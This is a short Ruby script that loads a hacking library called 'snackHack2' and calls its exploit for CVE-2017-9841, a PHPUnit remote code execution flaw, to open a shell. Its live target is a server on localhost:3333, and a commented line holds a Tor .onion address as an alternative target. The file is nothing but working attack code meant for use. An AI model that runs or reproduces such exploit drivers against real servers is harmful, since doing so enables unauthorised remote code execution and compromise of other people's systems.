require './lib/snackHack2'
# http://wsptlnuoo3johqzcdlwuj5zcwfh2dwmswz6hahqctuxttvxpanypmwad.onion
# http://localhost:3333
php = Snackhack2::CVE20179841.new("http://localhost:3333")
#php.run
php.shell